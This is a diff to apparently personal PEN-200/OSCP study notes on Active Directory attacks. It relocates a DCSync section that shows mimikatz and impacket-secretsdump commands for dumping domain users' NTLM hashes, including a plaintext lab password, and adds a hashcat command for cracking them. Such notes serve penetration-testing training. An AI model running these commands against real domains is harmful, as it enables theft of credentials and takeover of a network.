@@ -430,6 +430,27 @@ python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 
              `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`
 
+## DCSync-Domain Controller Synchronization
+- Condition:  User needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. *By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights*
+- Hence, must have access to members of the Domain Admins, Enterprise Admins, and Administrators groups
+- Target of your victim must be known or can be administrator
+
+### DCSync On windows
+```powershell
+#Assuming we have access to a domain joined machine, we launch mimikatz
+#output of lsadump::dcsync is NTLM hash of target user including Administrator
+mimikatz # lsadump::dcsync /user:corp\*targetusertoobtaincredential*
+```
+
+### DCSync on Kali
+```bash
+#192.168.50.70 = IP of Domain Controller, output is the hash of target user
+impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
+
+### use hashcat to decrypt hash
+`hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
 
 # Active Directory Pentesting
 
@@ -592,23 +613,6 @@ mimikatz # misc::cmd whoami
 - then crack the hash using hashcat to get the clear password
 - after attack, REMEMBER to delete the SPN
 
-
-### DCSync-Domain Controller Synchronization
-- Condition:  User needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. *By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights*
-- Hence, must have access to members of the Domain Admins, Enterprise Admins, and Administrators groups
-
-#### DCSync On windows
-```powershell
-#output of lsadump::dcsync is NTLM hash of target user including Administrator
-mimikatz # lsadump::dcsync /user:corp\*targetusertoobtaincredential*
-```
-
-#### DCSync on Kali
-```bash
-#192.168.50.70 = IP of Domain Controller, output is the hash of target user
-impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
-
-```
 
 ## Metasploit (msf6)
 - start: `msfconsole`
